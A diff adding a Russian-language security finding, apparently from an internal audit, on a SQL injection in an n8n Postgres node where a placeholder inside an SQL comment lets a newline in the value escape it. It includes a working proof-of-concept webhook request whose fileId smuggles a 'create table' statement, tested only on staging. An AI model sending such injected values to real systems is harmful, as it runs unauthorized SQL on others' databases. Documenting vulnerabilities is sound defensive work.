@@ -1,0 +1,17 @@
+S1 (найдено 2026-09-28 при разборе хвостов агентов, вне списка R1–R16) — SQL-инъекция через $N в SQL-комментарии.
+
+Механизм: n8n 2.36.7 Postgres v2 (executeQuery) форматирует запрос на клиенте:
+  node_modules/n8n-nodes-base/dist/nodes/Postgres/v2/helpers/utils.js:318  db.multi(pgp.helpers.concat(queries))
+pg-promise подставляет $N по всему тексту, включая `--`-комментарии. Значение с переводом строки
+закрывает комментарий, а открывающая кавычка литерала остаётся внутри комментария — хвост значения
+исполняется как SQL.
+
+Доказательство на STAGING (http://localhost:5678, канон = HEAD 2026-09-28, режим совместимости открыт, БЕЗ токена):
+  до:     select to_regclass('public.crpoc_marker')  -> (пусто)
+  запрос: POST /webhook/DeleteFile {"fileId":"00000000-0000-0000-0000-000000000000\n; create table public.crpoc_marker(x int); --"}
+  ответ:  200 {"success":true,...,"deletedChunks":0}
+  после:  select to_regclass('public.crpoc_marker')  -> crpoc_marker     <- таблица создана запросом без авторизации
+  уборка: drop table public.crpoc_marker -> removed
+
+Прод НЕ проверялся (запрещено: атака на живую систему). На проде развёрнут тот же Delete File (A1, 2026-09-24):
+комментарий «-- A1: owner-scoped delete. $1 fileId, …» есть в каноне f08546f1.
